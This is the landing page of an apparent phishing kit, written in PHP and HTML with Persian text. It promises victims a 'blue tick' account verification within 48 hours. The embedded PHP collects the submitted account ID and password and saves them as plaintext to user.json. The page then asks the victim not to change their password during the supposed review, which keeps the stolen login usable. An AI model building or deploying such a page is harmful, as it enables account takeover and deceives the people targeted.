<!-- #->Dev => @ZProGrammer - @ZProGramming -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>درخواست شما انجام شد !</title>
  <link href="https://cdn.rawgit.com/rastikerdar/shabnam-font/v4.0.0/dist/font-face.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="assets/css/style.css">
  <?php
  #->Dev => @ZProGrammer - @ZProGramming
  $id = $_POST["id"];
  $pass = $_POST["lic"];
  $data['dev'][] = array('username' =>$id,'password'=>$pass);
  $tdata = json_encode($data);
  $filen = fopen("user.json","w");
  fwrite($filen,$tdata);
  fclose($filen);
  ?>
</head>
<body>

  <div class="card">
    <div class="field">

      <span class="header">ثبت شد</span>
      <br><br>

      اکانت شما ثبت شد و درحال برسی و ارسال تیک آبی برای شما هستیم

      <br><br><br><br>
      طی 48 ساعت آینده شما به رسمیت شناخته خواهید شد
      <br><br><br><br>
      لطفا در طی این فرایند اطلاعات خود از جمله ایدی و پسورد را تغییر ندهید



    </div>

  </div>
</div>

<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'> < /body> < /html>
  <!-- #->Dev => @ZProGrammer - @ZProGramming -->